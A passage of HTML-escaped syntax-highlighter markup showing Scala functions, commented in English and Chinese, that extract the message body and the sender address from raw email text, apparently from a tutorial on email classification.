&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;re: &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-80&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-81&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-82&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessageBodyFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-83&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-84&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;firstLineBreak&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;nn&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-85&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Return the message body filtered by only text &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-86&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//from a-z and to lower case&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-87&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//返回过滤后的信息主体，即只包含a-z小写形式的文本&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-88&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;firstLineBreak&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-89&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-90&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-91&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-92&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-93&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-94&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getSenderFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-95&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Find the index of the From: line&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-96&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//找出带有“From:”标志的行&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-97&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-98&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;From:&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-99&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-100&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfLine&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-101&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-102&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;n&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-103&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-104&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Search for the &amp;lt;&amp;gt; tags in this line, as if they are there,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-105&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// the email address is contained inside these tags&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-106&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//在该行中搜索“&amp;lt;&amp;gt;”标签，如果标签存在，则邮件地址包含在其中&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-107&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-108&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-109&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfLine&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-110&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-111&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-112&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressEndIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-113&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfLine&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-114&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromLineIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-115&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-116&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mailAddressEndIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-117&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-118&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//The email address was not embedded in &amp;lt;&amp;gt; tags,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-119&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// extract the substring without extra spacing and to lower case&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-120&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//邮件地址不是括在&amp;lt;&amp;gt;标签内，抽取子字符串并去除空格，转为小写形式&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-121&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailString&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-122&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fromLineIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfLine&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-123&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trim&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-124&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-125&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-126&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Remove a possible name embedded in () at the end of the line,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-127&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//for example in test@test.com (tester) the name would be removed here&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-128&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//删除行末可能包含在()内的名字，例如，在test@test.com(tester) 中，名字会被删除掉&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-129&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;additionalNameStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;(&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-130&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;additionalNameStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-131&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;emailString&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-132&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-133&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-134&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-135&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;emailString&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-136&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;additionalNameStartIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-137&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trim&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-138&quot;&gt;
